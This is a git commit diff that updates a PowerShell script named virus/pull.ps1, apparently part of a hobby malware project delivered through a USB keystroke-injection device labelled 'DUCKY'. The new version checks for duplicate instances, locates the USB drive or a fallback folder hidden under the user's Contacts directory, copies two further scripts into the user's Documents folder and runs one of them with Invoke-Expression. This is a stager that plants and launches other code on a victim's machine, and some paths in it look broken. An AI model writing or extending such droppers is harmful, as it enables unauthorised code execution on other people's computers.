7d7f00a14b643c85f8ef0aac23f704608773b1d6
Mavis Coffey <129871621+mavisinator30001@users.noreply.github.com>
2025-01-03 15:25:31 -0500

    Update pull.ps1

--- virus/pull.ps1
+++ virus/pull.ps1
@@ -1,9 +1,32 @@
-$localUsername = $env:USERNAME
-$driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='DUCKY'").DriveLetter
-$callPathBeforeCopy = Get-ChildItem -Path $driveLetter\virus -Recurse -Filter "call.ps1"
-$callMoveDir = "C:\Users\$localUsername\Documents\virus\Virus\call.ps1"
-$eventPathBeforeCopy = Get-ChildItem -Path $driveletter\virus -Recurse -Filter "event.ps1"
-$eventMoveDir = "C:\Users\$localUsername\Documents\virus\Virus\event.ps1"
+$currentPID = $PID
+$duplicateProcess = Get-Process -Name "powershell" | Where-Object { $_.Id -ne $currentPID -and $_.CommandLine -match $MyInvocation.MyCommand.Path }
 
-Copy-Item -Path $callPathBeforeCopy -Destination $callMoveDir
-Copy-Item -Path $eventPathBeforeCopy -Destination $eventMoveDir
+if ($duplicateProcess.Count -gt 1) {
+    Write-Output "Duplicate found. Terminating new process..."
+    exit 1
+}
+
+
+$localUsername = $env:USERNAME
+
+$driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='DUCKY'").DriveLetter
+
+$callPathBeforeCopy = Get-ChildItem -Path $driveLetter\* -Recurse -Filter "virus\call.ps1"
+$callPathBeforeDelayCopy = Get-ChildItem -Path C:\Users\$env:USERNAME\Contacts\virus
+
+$callMoveDir = "C:\Users\$localUsername\Document\virus\call.ps1"
+
+$eventPathBeforeCopy = Get-ChildItem -Path $driveletter\virus -Recurse -Filter "event.ps1"
+$eventPathBeforeDelayCopy = Get-ChildItem -Path C:\Users\$env:USERNAME\Contacts\virus -Recurse -Filter "event.ps1"
+$eventMoveDir = "C:\Users\$localUsername\Document\virus\event.ps1"
+
+
+If ($driveLetter){
+    Copy-Item -Path $callPathBeforeCopy -Destination $callMoveDir
+    Copy-Item -Path $eventPathBeforeCopy -Destination $eventMoveDir
+} else {
+    Copy-Item -Path $callPathBeforeDelayCopy -Destination $callMoveDir
+    Copy-Item -Path $eventPathBeforeDelayCopy -Destination $eventMoveDir
+}
+Invoke-Expression -Command .\event.ps1
+exit
